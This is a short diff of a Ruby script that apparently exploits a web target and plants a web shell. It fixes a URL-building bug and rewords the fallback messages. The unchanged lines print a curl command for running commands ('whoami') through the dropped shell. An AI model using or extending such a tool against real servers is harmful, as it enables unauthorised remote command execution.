@@ -103,7 +103,7 @@ $target = ARGV[0]
 
 # Check input for protocol
 if not $target.start_with?('http')
-  $target = "http://#{target}"
+  $target = "http://#{$target}"
 end
 # Check input for the end
 if not $target.end_with?('/')
@@ -267,8 +267,8 @@ if webshellpath
   # Feedback
   puts "[*] Fake shell:   curl '#{$target}#{webshell}' -d 'c=whoami'"
 elsif writeshell
-  puts "[!] FAILED to find writeable folder"
-  puts "[*] Dropping back to ugly shell..."
+  puts "[!] FAILED: Coudn't find writeable web path"
+  puts "[*] Dropping back direct commands (expect an ugly shell!)"
 end
 
 
